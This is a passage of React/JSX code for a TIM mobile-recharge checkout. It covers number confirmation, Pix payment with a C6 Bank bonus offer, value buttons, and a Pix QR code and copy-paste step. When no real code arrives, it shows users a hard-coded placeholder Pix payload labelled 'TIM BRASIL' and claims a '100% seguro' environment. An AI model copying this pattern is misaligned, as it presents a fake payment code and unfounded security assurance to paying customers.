              id="payment-step-title"
              className="text-xl sm:text-2xl font-extrabold text-primary-foreground mb-6"
            >
              Fazer uma recarga TIM
            </h2>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-5 sm:gap-6 lg:gap-8 items-start">
              {/* Col 1: Número */}
              <div>
                <p className="text-sm text-primary-foreground/60 mb-2">
                  Número TIM que receberá a recarga
                </p>
                <div className="flex items-center gap-3 bg-primary-foreground border border-transparent rounded-2xl px-5 sm:px-6 py-3.5 shadow-sm">
                  <div className="flex-1">
                    <p className="text-xs sm:text-sm font-bold text-primary/70 mb-0.5">
                      Meu número TIM
                    </p>
                    <p className="text-xl sm:text-2xl font-black text-primary tracking-tight mb-0.5">
                      {phone}
                    </p>
                  </div>
                  <Button
                    size="sm"
                    className="rounded-full bg-primary/10 text-primary font-bold border-none hover:bg-primary/20 transition-colors px-4 py-2"
                    onClick={() => {
                      setStep("phone", true);
                      setPixData(null);
                      safeRemoveItem("recargaOrderData");
                      generateAttemptedForRef.current = "";
                    }}
                  >
                    Alterar
                  </Button>
                </div>
              </div>

              {/* Col 2: Método de pagamento */}
              <div>
                <p className="text-sm text-primary-foreground/60 mb-2">Método de pagamento</p>
                <div className="space-y-3">
                  <button
                    onClick={() => setPaymentMethod("pix")}
                    className={`w-full flex justify-between items-center gap-4 relative text-left group ${
                      paymentMethod === "pix"
                        ? "mb-3 sm:mb-4 rounded-2xl ring-4 ring-emerald-500 bg-primary-foreground px-4 py-2 sm:py-3 transition-all"
                        : "rounded-2xl px-4 py-2 sm:py-3 border-2 border-primary-foreground/20 bg-primary-foreground/5 hover:bg-primary-foreground/10 transition-all mb-3 sm:mb-4"
                    }`}
                  >
                    <div className="flex-shrink-0 flex items-center gap-2 sm:gap-3 pl-1">
                      <div className="w-[2.5rem] h-[2.5rem] sm:w-[2.75rem] sm:h-[2.75rem] rounded-[14px] bg-[#F4F4F5] flex items-center justify-center shrink-0 shadow-sm border border-zinc-200/60">
                        <svg
                          className="w-6 h-6 text-[#32BCAD]"
                          viewBox="0 0 512 512"
                          fill="currentColor"
                        >
                          <path d="M382.56 349.37c-16.89 0-32.78-6.58-44.74-18.53l-71.9-71.9a15.06 15.06 0 0 0-20.57 0l-72.29 72.29c-11.96 11.96-27.85 18.54-44.74 18.54h-11.44l91.43 91.43c24.65 24.65 64.61 24.65 89.26 0l91.82-91.82h-6.83z" />
                          <path d="M128.32 162.24c16.89 0 32.78 6.58 44.74 18.54l72.29 72.29a14.56 14.56 0 0 0 20.57 0l71.9-71.9c11.96-11.96 27.85-18.54 44.74-18.54h6.83l-91.82-91.82c-24.65-24.65-64.61-24.65-89.26 0l-91.43 91.43h11.44z" />
                          <path d="M440.87 208.57l-46.26-46.26c-1.65 1.1-3.47 1.86-5.43 1.86h-6.83c-12.63 0-24.51 4.92-33.44 13.85l-71.9 71.9c-7.95 7.95-18.4 11.92-28.85 11.92s-20.9-3.97-28.85-11.92l-72.29-72.29c-8.93-8.93-20.81-13.85-33.44-13.85h-11.44c-1.96 0-3.78-.76-5.43-1.86l-46.65 46.65c-24.65 24.65-24.65 64.61 0 89.26l46.65 46.65c1.65-1.1 3.47-1.86 5.43-1.86h11.44c12.63 0 24.51-4.92 33.44-13.85l72.29-72.29c15.9-15.9 41.8-15.9 57.7 0l71.9 71.9c8.93 8.93 20.81 13.85 33.44 13.85h6.83c1.96 0 3.78.76 5.43 1.86l46.26-46.26c24.65-24.65 24.65-64.61 0-89.26z" />
                        </svg>
                      </div>
                      <span
                        className={`text-[20px] sm:text-[22px] font-extrabold ${paymentMethod === "pix" ? "text-primary" : "text-primary-foreground"}`}
                      >
                        Pix
                      </span>
                    </div>

                    <div
                      className={`flex items-center gap-1.5 sm:gap-2 rounded-xl px-2 py-1.5 sm:px-3 sm:py-2 w-full max-w-[190px] sm:max-w-[220px] h-[3.5rem] sm:h-[4rem] flex-shrink-0 ${paymentMethod === "pix" ? "border border-primary/20 bg-primary/5 shadow-sm" : "border border-primary-foreground/20 bg-primary-foreground/10 opacity-90"}`}
                    >
                      <div className="flex items-center justify-center bg-white rounded flex-shrink-0 px-1 sm:px-1.5 py-0.5 border border-zinc-200/80 shadow-sm shadow-zinc-200/50">
                        <span className="text-black font-black text-[12px] sm:text-[13px] tracking-tighter">
                          C6
                        </span>
                        <span className="text-black font-light text-[12px] sm:text-[13px] tracking-[0.05em] ml-[1px]">
                          BANK
                        </span>
                      </div>
                      <p
                        className={`text-[10px] sm:text-[10.5px] font-bold leading-tight ${paymentMethod === "pix" ? "text-blue-900" : "text-primary-foreground"}`}
                      >
                        <span className="text-[#FF0000]">🎁</span> Ganhe +500MB grátis pagando com
                        C6 Bank
                      </p>
                    </div>

                    {paymentMethod === "pix" && (
                      <div className="absolute -bottom-1 -right-1 w-5 h-5 rounded-full bg-emerald-500 flex items-center justify-center">
                        <Check className="w-3 h-3 text-white" />
                      </div>
                    )}
                  </button>
                </div>
              </div>

              {/* Col 3: Valor da recarga */}
              <div id="valor-recarga-section">
                <p className="text-sm text-primary-foreground/60 mb-2">Valor da recarga</p>
                <div className="mb-3 sm:mb-4 rounded-2xl ring-4 ring-emerald-500 bg-primary-foreground px-4 py-2 sm:py-3 text-primary flex justify-between items-center gap-4 relative">
                  <div className="flex-shrink-0 flex flex-col justify-center">
                    <p className="text-[11px] sm:text-xs uppercase tracking-wide text-primary font-black mb-1">
                      BÔNUS SEMANAL
                    </p>
                    <div className="flex items-start text-2xl sm:text-3xl font-extrabold leading-none tracking-tight">
                      <span>R$ {Math.floor(selectedValue)}</span>
                      {selectedValue % 1 !== 0 && (
                        <span className="text-[14px] sm:text-[16px] font-bold mt-[2px] ml-[2px]">
                          {Math.round((selectedValue % 1) * 100)}
                        </span>
                      )}
                    </div>
                  </div>
                  {(() => {
                    const bonusText = BONUS_MAP[selectedValue];
                    if (!bonusText) return null;
                    return (
                      <div className="flex items-center bg-primary/5 border border-primary/20 rounded-xl px-2 py-1.5 sm:px-3 sm:py-2 w-full max-w-[190px] sm:max-w-[220px] h-[3.5rem] sm:h-[4rem] flex-shrink-0">
                        <p className="text-[10px] sm:text-[10.5px] font-bold leading-tight text-primary">
                          {bonusText}
                        </p>
                      </div>
                    );
                  })()}
                  <div className="absolute -bottom-1 -right-1 w-5 h-5 rounded-full bg-emerald-500 flex items-center justify-center">
                    <Check className="w-3 h-3 text-white" />
                  </div>
                </div>
                <div className="mt-6 sm:mt-7 grid grid-cols-3 gap-5 sm:gap-[22px] place-items-center w-full max-w-[290px] sm:max-w-[340px] mx-auto">
                  {RECHARGE_VALUES.map((val) => (
                    <button
                      key={val}
                      onClick={() => {
                        setSelectedValue(val);
                        setPixData(null);
                        safeRemoveItem("recargaOrderData");
                        generateAttemptedForRef.current = "";
                      }}
                      className={`${rechargeValueButtonBaseClass} ${
                        selectedValue === val
                          ? "bg-primary-foreground text-primary ring-4 ring-emerald-500 scale-110"
                          : "bg-primary-foreground/15 text-primary-foreground hover:bg-primary-foreground/25 border border-primary-foreground/20"
                      }`}
                    >
                      <span className="text-[10px] font-semibold leading-none mb-0.5">R$</span>
                      <span className="relative text-[25px] sm:text-[27px] font-black leading-none">
                        {Math.floor(val)}
                        {val % 1 !== 0 && (
                          <span className="absolute top-[2px] -right-[17px] text-[11px] sm:text-[12px] font-bold">
                            {Math.round((val % 1) * 100)}
                          </span>
                        )}
                      </span>
                      {selectedValue === val && (
                        <div className="absolute -bottom-1 -right-1 w-5 h-5 rounded-full bg-emerald-500 flex items-center justify-center shadow-sm">
                          <Check className="w-3 h-3 text-white" />
                        </div>
                      )}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Bottom buttons */}
            <div id="payment-bottom-buttons" className="mt-8 flex gap-3">
              <Button
                size="lg"
                className="flex-1 h-14 rounded-full border-2 border-primary-foreground bg-transparent text-primary-foreground text-base font-semibold hover:bg-primary-foreground/10 transition-all duration-300"
                onClick={() => {
                  setStep("phone", true);
                  setPixData(null);
                  safeRemoveItem("recargaOrderData");
                  generateAttemptedForRef.current = "";
                }}
              >
                Voltar
              </Button>
              <Button
                size="lg"
                className={`flex-1 h-14 rounded-full text-base font-semibold border-none transition-all duration-300 ${
                  !loading
                    ? "bg-[#FFCC00] text-primary hover:bg-[#FFD633] hover:shadow-[0_0_20px_rgba(255,204,0,0.6)] shadow-[0_4px_14px_rgba(255,204,0,0.35)] hover:-translate-y-0.5"
                    : "bg-[hsl(47,44%,52%)]/55 text-primary/70"
                }`}
                onClick={handleRecarregar}
                disabled={loading}
              >
                {loading ? <Loader2 className="w-5 h-5 animate-spin mr-2" /> : null}
                {loading ? "Processando..." : "Finalizar recarga"}
              </Button>
            </div>
          </motion.div>
        )}

        {/* ===== STEP 3: PIX QR Code ===== */}
        {step === "pix" && (
          <motion.div
            key="pix"
            id="pix-section"
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            transition={{ duration: 0.25 }}
            className="section-container py-2 sm:py-6 flex flex-col items-center"
          >
            <div className="bg-background rounded-[24px] p-3 sm:p-6 mb-4 sm:mb-8 max-w-md w-full shadow-2xl overflow-hidden">
              {/* Header with Pix logo */}
              <div className="flex flex-col items-center justify-center gap-1 mb-2 sm:mb-4 mt-1">
                <div className="flex items-center gap-2 sm:gap-3 mb-1 sm:mb-2">
                  <PixIcon className="w-6 h-6 sm:w-7 sm:h-7 text-[#32BCAD]" />
                  <span className="text-[20px] sm:text-2xl font-extrabold text-foreground tracking-tight">
                    Pagamento via PIX
                  </span>
                </div>
                <p className="text-center text-[12px] sm:text-[14px] font-medium text-muted-foreground/90 max-w-[280px] sm:max-w-sm mx-auto leading-snug">
                  Escaneie o QR Code ou copie a chave PIX para concluir o pagamento com segurança.
                </p>
              </div>

              {/* Timer & Status */}
              <div
                id="pix-timer-section"
                className="flex flex-col items-center gap-1 sm:gap-1.5 mb-2 sm:mb-3 w-full p-2 sm:p-4 bg-[#f8f9fa] rounded-xl sm:rounded-2xl border border-zinc-200/60 shadow-sm"
              >
                <div className="text-[18px] sm:text-[22px] font-black tracking-tight text-[#FF0000]">
                  Expira em {formatTime(timeLeft)}
                </div>
                <div className="flex flex-wrap items-center justify-center gap-2 w-full mt-0.5">
                  <div
                    className={`px-3 sm:px-5 py-1 sm:py-2 rounded-lg sm:rounded-xl text-[12px] sm:text-sm font-bold shadow-sm ${statusClassName}`}
                  >
                    {getPaymentStatusLabel(currentStatus)}
                  </div>
                  {checkingStatus && (
                    <div className="px-4 sm:px-5 py-1 sm:py-2 rounded-lg sm:rounded-xl text-[11px] sm:text-xs font-semibold bg-muted text-muted-foreground shadow-sm">
                      Atualizando...
                    </div>
                  )}
                </div>
              </div>

              {/* QR Code */}
              <div className="flex flex-col items-center mb-2 sm:mb-3 w-full">
                <p className="text-[11px] sm:text-[13px] font-bold text-muted-foreground/80 uppercase tracking-widest mb-1 sm:mb-1.5">
                  Escaneie com o app do seu banco
                </p>
                <div className="bg-white border-[2px] sm:border-[3px] border-zinc-100 rounded-3xl p-1.5 sm:p-3 shadow-sm relative overflow-hidden group">
                  <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/50 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-700 pointer-events-none" />
                  {loading ? (
                    <div className="w-[110px] h-[110px] sm:w-[130px] sm:h-[130px] flex flex-col items-center justify-center text-muted-foreground text-sm relative z-10 gap-3">
                      <Loader2 className="w-8 h-8 text-[#32BCAD] animate-spin" />
                    </div>
                  ) : pixCode ? (
                    <QRCodeSVG
                      value={pixCode}
                      size={130}
                      level="M"
                      bgColor="#ffffff"
                      fgColor="#000000"
                      className="relative z-10 w-[110px] h-[110px] sm:w-[130px] sm:h-[130px]"
                    />
                  ) : pixQrCodeSrc ? (
                    <img
                      src={pixQrCodeSrc}
                      alt="QR Code PIX"
                      className="w-[110px] h-[110px] sm:w-[130px] sm:h-[130px] object-contain relative z-10"
                    />
                  ) : (
                    <QRCodeSVG
                      value="00020101021126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-4266141740005204000053039865802BR5913TIM BRASIL6008SAO PAULO62070503***63041D3D"
                      size={130}
                      level="M"
                      bgColor="#ffffff"
                      fgColor="#000000"
                      className="relative z-10 w-[110px] h-[110px] sm:w-[130px] sm:h-[130px]"
                    />
                  )}
                </div>
              </div>

              <div className="w-full max-w-[320px] flex items-center justify-center gap-4 bg-white border border-[#32BCAD]/40 rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2 sm:py-3 shadow-sm mb-2 sm:mb-3 mt-1 sm:mt-2 mx-auto">
                <div className="flex items-center justify-center bg-white rounded-md sm:rounded-lg flex-shrink-0 px-2 py-0.5 sm:py-1 border border-zinc-200/80 shadow-sm">
                  <span className="text-black font-black text-[18px] sm:text-[22px] tracking-tighter">
                    C6
                  </span>
                  <span className="text-black font-light text-[18px] sm:text-[22px] tracking-[0.05em] ml-[1px]">
                    BANK
                  </span>
                </div>
                <p className="text-[11px] sm:text-[13px] font-bold text-blue-900 text-center leading-[1.25]">
                  <span className="text-[#FF0000]">🎁</span> Ganhe +500MB grátis
                  <br />
                  pagando com C6 Bank
                </p>
              </div>

              {/* Pix key copy */}
              <div className="w-full mb-2 sm:mb-3 mt-0 relative z-20">
                <p className="text-[11px] sm:text-[13px] font-bold text-muted-foreground/80 uppercase tracking-widest text-center mb-1 sm:mb-1.5">
                  Chave PIX copia e cola
                </p>
                <div className="flex items-center gap-1.5 sm:gap-2 w-full">
                  <div className="flex-1 h-10 sm:h-12 flex items-center bg-[#f8f9fa] border-2 border-zinc-200 hover:border-zinc-300 transition-colors rounded-[12px] sm:rounded-[16px] px-3 sm:px-4 text-[12px] sm:text-[14px] font-medium font-mono truncate shadow-sm overflow-hidden whitespace-nowrap text-ellipsis mr-1">
                    {loading ? (
                      "Gerando chave..."
                    ) : pixCode ? (
                      <span className="text-foreground/80 text-ellipsis overflow-hidden block w-full">
                        {pixCode}
                      </span>
                    ) : (
                      <span className="text-foreground/80 text-ellipsis overflow-hidden block w-full">
                        00020101021126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-4266141740005204000053039865802BR5913TIM
                        BRASIL6008SAO PAULO62070503***63041D3D
                      </span>
                    )}
                  </div>
                  <Button
                    size="lg"
                    onClick={handleCopy}
                    disabled={loading}
                    className={`shrink-0 h-10 sm:h-12 px-3 sm:px-5 rounded-[12px] sm:rounded-[16px] text-[12px] sm:text-[14px] font-black tracking-wide border-none shadow-[0_2px_10px_rgba(50,188,173,0.25)] hover:-translate-y-0.5 transition-all duration-300 gap-1.5 sm:gap-2 ${
                      copied
                        ? "bg-emerald-500 hover:bg-emerald-600 text-white"
                        : "bg-[#32BCAD] hover:bg-[#2CA89B] text-white"
                    }`}
                  >
                    {copied ? (
                      <Check className="w-4 h-4 sm:w-5 sm:h-5" />
                    ) : (
                      <Copy className="w-4 h-4 sm:w-5 sm:h-5" />
                    )}
                    <span className="hidden sm:inline">{copied ? "COPIADO!" : "COPIAR"}</span>
                    <span className="sm:hidden">{copied ? "COPIADO" : "COPIAR"}</span>
                  </Button>
                </div>

                <AnimatePresence>
                  {copied && (
                    <motion.div
                      initial={{ opacity: 0, y: -10, scale: 0.95 }}
                      animate={{ opacity: 1, y: 0, scale: 1 }}
                      exit={{ opacity: 0, y: -10, scale: 0.95 }}
                      transition={{ duration: 0.2 }}
                      className="absolute left-0 right-0 mt-3 p-3 bg-emerald-50 border border-emerald-200/60 rounded-xl shadow-[0_4px_12px_rgba(16,185,129,0.15)] flex flex-col items-center justify-center text-center z-30"
                    >
                      <div className="flex items-center gap-2 mb-1">
                        <div className="bg-emerald-500 w-5 h-5 rounded-full flex items-center justify-center">
                          <Check className="w-3 h-3 text-white" />
                        </div>
                        <span className="font-bold text-emerald-800 text-[13px] sm:text-[14px]">
                          Código copiado com sucesso!
                        </span>
                      </div>
                      <p className="text-emerald-700/80 text-[11px] sm:text-[12px] font-medium leading-tight max-w-[260px]">
                        Agora cole no app do seu banco para finalizar seu pagamento.
                      </p>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>

              {/* Summary Block */}
              <div className="w-full bg-[#f8f9fa] border border-zinc-200/60 rounded-xl sm:rounded-2xl p-2.5 sm:p-4 mb-2 sm:mb-3 mt-4 sm:mt-5 shadow-sm">
                <div className="space-y-1.5 sm:space-y-2.5">
                  <div className="flex justify-between items-center text-[13px] sm:text-[14px] px-0.5">
                    <span className="text-muted-foreground font-medium">Número</span>
                    <span className="font-bold text-foreground">{phone}</span>
                  </div>
                  <div className="w-full h-px bg-zinc-200/60" />
                  <div className="flex justify-between items-center px-0.5">
                    <span className="text-muted-foreground font-medium text-[13px] sm:text-[14px]">
                      Valor
                    </span>
                    <div className="flex items-start font-black text-foreground text-[18px] sm:text-[20px] tracking-tight text-[#32BCAD]">
                      <span>R$ {Math.floor(selectedValue)}</span>
                      {selectedValue % 1 !== 0 && (
                        <span className="text-[11px] sm:text-[13px] font-bold mt-[1px] ml-[2px]">
                          {Math.round((selectedValue % 1) * 100)}
                        </span>
                      )}
                    </div>
                  </div>

                  {pixData?.transactionId && (
                    <>
                      <div className="w-full h-px bg-zinc-200/60" />
                      <div className="flex justify-between items-center gap-4 text-[13px] sm:text-[14px] px-0.5">
                        <span className="text-muted-foreground font-medium">Pedido</span>
                        <span className="font-semibold text-muted-foreground/80 text-[11px] sm:text-[12px] truncate text-right">
                          {pixData.transactionId}
                        </span>
                      </div>
                    </>
                  )}
                  <div className="w-full h-px bg-zinc-200/60" />
                  <div className="flex justify-between items-center text-[13px] sm:text-[14px] px-0.5">
                    <span className="text-muted-foreground font-medium">Forma de pagamento</span>
                    <div className="flex items-center gap-1.5 font-bold text-foreground">
                      <PixIcon className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#32BCAD]" />
                      PIX
                    </div>
                  </div>
                </div>
              </div>

              {/* Trust Elements */}
              <div className="w-full max-w-[320px] mx-auto flex flex-col items-center mb-1 sm:mb-2 mt-1">
                <div className="flex items-center justify-center gap-1.5 mb-1 text-emerald-600">
                  <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                  <span className="text-[12px] sm:text-[13px] font-bold uppercase tracking-wide">
                    Pagamento seguro
                  </span>
                </div>
                <p className="text-center text-[10px] sm:text-[11px] font-medium text-muted-foreground/80 leading-relaxed max-w-[280px] mb-3 sm:mb-4">
                  Ambiente 100% seguro.
                </p>
                <button
                  className="text-[11px] sm:text-[12px] font-bold text-muted-foreground hover:text-foreground transition-colors underline underline-offset-4 decoration-muted-foreground/30 hover:decoration-foreground/50"
                  onClick={() => toast.info("Em breve: link de suporte.")}
                >
                  Problemas no pagamento? Fale com o suporte
                </button>
              </div>

              {/* Debug: show raw response if no pixCode found */}
              {!pixCode && pixData && (
                <div className="mt-4 p-3 bg-muted rounded-lg text-xs text-muted-foreground overflow-auto max-h-40">
                  <p className="font-semibold mb-1">Resposta da API:</p>
                  <pre>{JSON.stringify(pixData, null, 2)}</pre>
                </div>
              )}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </main>
  );
}
